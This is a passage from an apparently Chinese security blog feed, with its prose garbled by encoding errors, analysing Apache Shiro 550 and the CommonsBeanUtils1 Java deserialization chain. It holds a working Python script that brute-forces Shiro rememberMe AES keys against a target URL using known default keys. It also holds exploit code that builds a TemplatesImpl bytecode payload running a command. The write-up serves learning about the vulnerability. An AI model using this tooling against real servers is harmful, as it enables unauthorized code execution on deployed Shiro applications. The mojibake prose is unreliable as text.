é“¾æ”»å‡»</h3><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯CBç‰ˆæœ¬é—®é¢˜ï¼Œä¸€å¼€å§‹ç”¨çš„expæ˜¯ä¹‹å‰è·Ÿçš„CB1è¿™æ¡é“¾çš„æ—¶å€™å†™çš„ï¼Œä½†æ˜¯é‚£ä¸ªCBç‰ˆæœ¬æ˜¯1.9.2ï¼Œyso ä¸­çš„é“¾å­ä¹Ÿæ˜¯ï¼Œè€Œshiroè‡ªå¸¦ä¸º 1.8.3ï¼Œæ‰€ä»¥éœ€è¦æŠŠç‰ˆæœ¬æ›´æ¢ä¸€ä¸‹ä¸ç„¶æœåŠ¡ç«¯å°±å¥½æŠ¥å¦‚ä¸‹é”™è¯¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.commons.beanutils.BeanComparator; local <span class="keyword">class</span> <span class="title class_">incompatible</span>: stream <span class="type">classdesc</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">2044202215314119608</span>, local <span class="keyword">class</span> <span class="title class_">serialVersionUID</span> = -<span class="number">3490850999041592962</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ª<code>serialVersionUID</code>å°±æ˜¯Javaçš„ä¸€ä¸ªæœºåˆ¶ï¼Œåœ¨Javaåœ¨ååºåˆ—åŒ–çš„æ—¶å€™æä¾›äº†ä¸€ä¸ªæœºåˆ¶ï¼Œåºåˆ—åŒ–æ—¶ä¼šæ ¹æ®å›ºå®šç®—æ³•è®¡ç®—å‡ºä¸€ä¸ªå½“å‰ç±»çš„ <code>serialVersionUID</code> å€¼ï¼Œå†™å…¥æ•°æ®æµä¸­ï¼›ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœå‘ç°å¯¹æ–¹çš„ç¯å¢ƒä¸­è¿™ä¸ªç±»è®¡ç®—å‡ºçš„ <code>serialVersionUID</code> ä¸åŒï¼Œåˆ™ååºåˆ—åŒ–å°±ä¼šå¼‚å¸¸é€€å‡º<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171126521.png" alt="image-20230717112620430"></p><h3 id="AESå¯†é’¥åˆ¤æ–­"><a href="#AESå¯†é’¥åˆ¤æ–­" class="headerlink" title="AESå¯†é’¥åˆ¤æ–­"></a>AESå¯†é’¥åˆ¤æ–­</h3><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜å‚è€ƒDrunkbabyå¸ˆå‚…çš„æè¿°å°±æ˜¯shiro åœ¨ 1.4.2 ç‰ˆæœ¬ä¹‹å‰ï¼Œ AES çš„æ¨¡å¼ä¸º CBCï¼Œ IV æ˜¯éšæœºç”Ÿæˆçš„ï¼Œå¹¶ä¸” IV å¹¶æ²¡æœ‰çœŸæ­£ä½¿ç”¨èµ·æ¥ï¼Œæ‰€ä»¥æ•´ä¸ª AES åŠ è§£å¯†è¿‡ç¨‹çš„ key å°±å¾ˆé‡è¦äº†ï¼Œæ­£æ˜¯å› ä¸º AES ä½¿ç”¨ Key æ³„æ¼å¯¼è‡´ååºåˆ—åŒ–çš„ cookie å¯æ§ï¼Œä»è€Œå¼•å‘ååºåˆ—åŒ–æ¼æ´ã€‚åœ¨ 1.4.2 ç‰ˆæœ¬åï¼Œshiro å·²ç»æ›´æ¢åŠ å¯†æ¨¡å¼ AES-CBC ä¸º AES-GCMï¼Œè„šæœ¬ç¼–å†™æ—¶å°±éœ€è¦è€ƒè™‘åŠ å¯†æ¨¡å¼å˜åŒ–çš„æƒ…å†µã€‚è®°å¾—ä¹‹å‰ç”¨è¿‡çš„é£é¸¿å¤§ä½¬çš„ä¸€æ¬¾shiroååºåˆ—åŒ–åˆ©ç”¨å·¥å…·å°±åšäº†keyçš„çˆ†ç ´ï¼Œä¸‹é¢æ˜¯å¤§ä½¬ Veraxy çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_AES_GCM</span>(<span class="params">msg, secretKey</span>):</span><br><span class="line">    aesCipher = AES.new(secretKey, AES.MODE_GCM)</span><br><span class="line">    ciphertext, authTag = aesCipher.encrypt_and_digest(msg)</span><br><span class="line">    <span class="keyword">return</span> (ciphertext, aesCipher.nonce, authTag)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>(<span class="params">target</span>):</span><br><span class="line">    keys = [<span class="string">&#x27;kPH+bIxk5D2deZiIxcaaaA==&#x27;</span>, <span class="string">&#x27;4AvVhmFLUs0KTA3Kprsdag==&#x27;</span>,<span class="string">&#x27;66v1O8keKNV3TTcGPK1wzg==&#x27;</span>, <span class="string">&#x27;SDKOLKn2J1j/2BHjeZwAoQ==&#x27;</span>]     <span class="comment"># æ­¤å¤„ç®€å•åˆ—ä¸¾å‡ ä¸ªå¯†é’¥</span></span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line"> </span><br><span class="line">    file_body = base64.b64decode(<span class="string">&#x27;rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> keys:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># CBCåŠ å¯†</span></span><br><span class="line">            encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">            base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(file_body)))</span><br><span class="line">            res = requests.get(target, cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;,timeout=<span class="number">3</span>,verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>) == <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;æ­£ç¡®KEY ï¼š&quot;</span> + key)</span><br><span class="line">                <span class="keyword">return</span> key</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;æ­£ç¡®key:&quot;</span> + key)</span><br><span class="line">                    <span class="keyword">return</span> key</span><br><span class="line">            <span class="comment"># GCMåŠ å¯†</span></span><br><span class="line">            encryptedMsg = encrypt_AES_GCM(file_body, base64.b64decode(key))</span><br><span class="line">            base64_ciphertext = base64.b64encode(encryptedMsg[<span class="number">1</span>] + encryptedMsg[<span class="number">0</span>] + encryptedMsg[<span class="number">2</span>])</span><br><span class="line">            res = requests.get(target, cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;, timeout=<span class="number">3</span>, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>) == <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;æ­£ç¡®KEY:&quot;</span> + key)</span><br><span class="line">                <span class="keyword">return</span> key</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;æ­£ç¡®key:&quot;</span> + key)</span><br><span class="line">                    <span class="keyword">return</span> key</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;æ­£ç¡®key:&quot;</span> + key)</span><br><span class="line">            <span class="keyword">return</span> key</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<br><a href="https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B%E4%B9%8B-deserialize-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">Javaååºåˆ—åŒ–Shiroç¯‡01-Shiro550æµç¨‹åˆ†æ | Drunkbabyâ€™s Blog (drun1baby.top)</a><br><a href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.999.0.0&vd_source=fdbccecc8d1a39a2449860e47c52b6e7">ç™½æ—¥æ¢¦ç»„é•¿</a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå­¦ä¹ ä¹‹CommonsBeanUtils1</title>
      <link href="/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsBeanUtils1/"/>
      <url>/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsBeanUtils1/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>jdk8<br>ä¾èµ–å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">1.9</span><span class="number">.2</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/commons-collections/commons-collections --&gt;  </span></span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">3.1</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/commons-logging/commons-logging --&gt;  </span></span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-logging&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-logging&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">1.2</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="CommonsBeanUtilsçš„å­¦ä¹ "><a href="#CommonsBeanUtilsçš„å­¦ä¹ " class="headerlink" title="CommonsBeanUtilsçš„å­¦ä¹ "></a>CommonsBeanUtilsçš„å­¦ä¹ </h2><p>commons-beanutils æ˜¯ Apache æä¾›çš„ä¸€ä¸ªç”¨äºæ“ä½œ JavaBean çš„å·¥å…·åŒ…ã€‚é‡Œé¢æä¾›äº†å„ç§å„æ ·çš„å·¥å…·ç±»ï¼Œè®©æˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿çš„å¯¹ bean å¯¹è±¡çš„å±æ€§è¿›è¡Œå„ç§æ“ä½œã€‚<br>åœ¨JavaBeanä¸­æˆ‘ä»¬é€šå¸¸æŠŠä¸€ç»„å¯¹åº”çš„è¯»æ–¹æ³•ï¼ˆ<code>getter</code>ï¼‰å’Œå†™æ–¹æ³•ï¼ˆ<code>setter</code>ï¼‰ç§°ä¸ºå±æ€§ï¼ˆ<code>property</code>ï¼‰ï¼Œå…·ä½“çš„å­¦ä¹ å¯ä»¥å‚è€ƒ<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">JavaBean - å»–é›ªå³°çš„å®˜æ–¹ç½‘ç«™ (liaoxuefeng.com)</a><br>ä¸‹é¢æ˜¯ä¸ªç®€å•çš„JavaBeanç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaBean</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;y0n3er&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Commons-BeanUtils ä¸­æä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³• <code>PropertyUtils.getProperty</code> ï¼Œè®©ä½¿ç”¨è€…å¯ä»¥ç›´æ¥è°ƒç”¨ä»»æ„ JavaBean çš„ getter æ–¹æ³•ï¼Œç¤ºä¾‹å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        System.out.println(PropertyUtils.getProperty(<span class="keyword">new</span> <span class="title class_">JavaBean</span>(),<span class="string">&quot;name&quot;</span>));  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151118483.png" alt="image-20230715111849205"><br>è¿™ç§è°ƒç”¨æ–¹æ³•Commons-BeanUtils ä¼šè‡ªåŠ¨æ‰¾åˆ° name å±æ€§çš„getter æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ getName ï¼Œç„¶åè°ƒç”¨å¹¶è·å¾—è¿”å›å€¼ï¼Œè¿™å°±å®¹æ˜“æƒ³åˆ°ä»»æ„å‡½æ•°è°ƒç”¨</p><h2 id="CommonsBeanUtils1é“¾å­åˆ†æ"><a href="#CommonsBeanUtils1é“¾å­åˆ†æ" class="headerlink" title="CommonsBeanUtils1é“¾å­åˆ†æ"></a>CommonsBeanUtils1é“¾å­åˆ†æ</h2><p>è¿™é‡Œè¿˜æ˜¯ä»å°¾éƒ¨åˆ†æï¼Œæˆ‘è¿™æ ·æ˜¯æœ€ç®€å•çš„ï¼Œè¿™é‡ŒååŠéƒ¨åˆ†å’ŒCC4ç±»ä¼¼<br>åœ¨ä¹‹å‰åŠ¨æ€åŠ è½½ TemplatesImpl å­—èŠ‚ç çš„åˆ†æä¸­é“¾å­å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#newTransformer() -&gt;TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()-&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å†å¾€å‰æ˜¯<code>TemplatesImpl.getOutputProperties()</code>ï¼Œå®ƒæ˜¯ä¸€ä¸ª getter æ–¹æ³•ï¼Œå¹¶ä¸”ä½œç”¨åŸŸä¸º publicï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ CommonsBeanUtils ä¸­çš„ <code>PropertyUtils.getProperty()</code> æ–¹å¼è·å–ï¼Œæ–¹å¼å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PropertyUtils.getProperty(TemplatesImpl, <span class="string">&quot;outputProperties&quot;</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„TemplatesImplåœ¨å®é™…è°ƒç”¨çš„æ—¶å€™å…¶å®å°±æ˜¯TemplatesImplçš„å¯¹è±¡ï¼Œç„¶åæ‰¾åˆ°outputPropertieså±æ€§çš„getter æ–¹æ³•å³<code>getOutputProperties()</code>ï¼Œç„¶åæŒ‰ç…§æƒ¯ä¾‹ç»§ç»­å¾€å‰è·Ÿçœ‹è°è°ƒç”¨äº†<code>PropertyUtils.getProperty()</code>è¿™é‡Œfind usagesçš„æ—¶å€™ä¸€å®šè¦æŠŠæºç ä¸‹äº†ï¼Œä¸ç„¶æ‰¾ä¸åˆ°ï¼Œæ–¹å¼å°±æ˜¯è¿›å…¥PropertyUtilsç±»ä¸­ï¼Œideaä¼šæç¤ºä½ ä¸‹è½½ï¼Œç„¶åä¸‹è½½å°±è¡Œäº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151119777.png" alt="image-20230715111957579"><br>æœ€ç»ˆæ‰¾åˆ°äº†<code>compare()</code>æ–¹æ³•ï¼Œç„¶åå°±æ˜¯æ‰¾è°è°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯è°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„ç±»å°±å¤ªå¤šäº†ï¼Œæ‰€ä»¥ç›´æ¥å°±ä»å¤§ä½¬çš„åšå®¢æ¬å°±è¡Œäº†ï¼Œæœ€ç»ˆæ‰¾åˆ°çš„æ˜¯<code>PriorityQueue</code> è¿™ä¸ªç±»çš„ <code>siftDownUsingComparator()</code> æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151120222.png" alt="image-20230715112028044"><br>ç„¶åç»§ç»­æ‰¾è°è°ƒç”¨äº†<code>siftDownUsingComparator()</code>ï¼Œå‘ç°åœ¨åŒç±»ä¸‹çš„<code>siftDown()</code>ä¸­è°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151120382.png" alt="image-20230715112042190"><br>ç„¶åç»§ç»­å¾€å‰æ‰¾å‘ç°åŒç±»ä¸‹çš„<code>heapify()</code>è°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151121852.png" alt="image-20230715112129660"><br>ç„¶åç»§ç»­æ‰¾è°è°ƒç”¨äº†<code>heapify()</code>æ–¹æ³•ï¼Œå‘ç°åŒç±»ä¸‹çš„readObjectä¸‹è°ƒç”¨äº†ï¼Œè¿™å°±å’ŒCC4ä¸€æ ·ï¼Œé‚£ä¹ˆåˆ°è¿™é‡Œæ•´æ¡é“¾å­å°±ç»“æŸäº†</p><h2 id="EXPç¼–å†™"><a href="#EXPç¼–å†™" class="headerlink" title="EXPç¼–å†™"></a>EXPç¼–å†™</h2><p>åœ¨<code>TemplatesImpl</code>ç±»ä¸­è¿˜æœ‰ä¸ª<code>TransletClassLoader</code>ç±»ç»§æ‰¿äº†<code>ClassLoader</code>ç±»å¹¶ä¸”é‡å†™äº†<code>defineClass()</code>æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151121071.png" alt="image-20230715112155839"><br>ç„¶åæˆ‘ä»¬ä»<code>TransletClassLoader#defineClass()</code> å‘å‰è¿½æº¯ä¸€ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt;</span><br><span class="line"></span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="line"></span><br><span class="line">-&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p><code>TemplatesImpl#getOutputProperties()</code> å’Œ <code>TemplatesImpl#newTransformer()</code> ï¼Œè¿™ä¸¤è€…çš„ä½œç”¨åŸŸæ˜¯publicï¼Œå¯ä»¥è¢«å¤–éƒ¨è°ƒç”¨ï¼Œæˆ‘ä»¬å°è¯•ç”¨ <code>TemplatesImpl#newTransformer()</code> æ„é€ ä¸€ä¸ªç®€å•çš„ exp<br>é¦–å…ˆæ„é€ å­—èŠ‚ç ï¼Œè¿™é‡Œçš„å­—èŠ‚ç å¿…é¡»ç»§æ‰¿<code>AbstractTranslet</code>ï¼Œå› ä¸ºç»§æ‰¿äº†è¿™ä¸€æŠ½è±¡ç±»ï¼Œæ‰€ä»¥å¿…é¡»è¦é‡å†™ä¸€ä¸‹é‡Œé¢çš„æ–¹æ³•ï¼Œè¿™é‡Œç›´æ¥å€Ÿç”¨å¤§ä½¬çš„å­—èŠ‚ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// TemplatesImpl çš„å­—èŠ‚ç æ„é€   </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesBytes</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM dom, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException&#123;&#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM dom, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException&#123;&#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TemplatesBytes</span><span class="params">()</span> <span class="keyword">throws</span> IOException&#123;  </span><br><span class="line">        <span class="built_in">super</span>();  </span><br><span class="line"> Runtime.getRuntime().exec(<span class="string">&quot;Calc&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å­—èŠ‚ç ç»“æŸï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ„é€ expï¼Œå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Calc&quot;</span>);  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">        templates.newTransformer();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›è°ƒç”¨é“¾ç»“åˆexpæ¥åˆ†æä¸€æ­¥æ­¥åˆ†æ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt;  </span><br><span class="line">TemplatesImpl#newTransformer() -&gt;  </span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt;  </span><br><span class="line">TemplatesImpl#defineTransletClasses() -&gt;  </span><br><span class="line">TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå®šä¹‰äº†ä¸€ä¸ªè®¾ç½®ç§æœ‰å±æ€§çš„æ–¹æ³•setFieldValue</p><figure class="highlight java"><table><tr><td 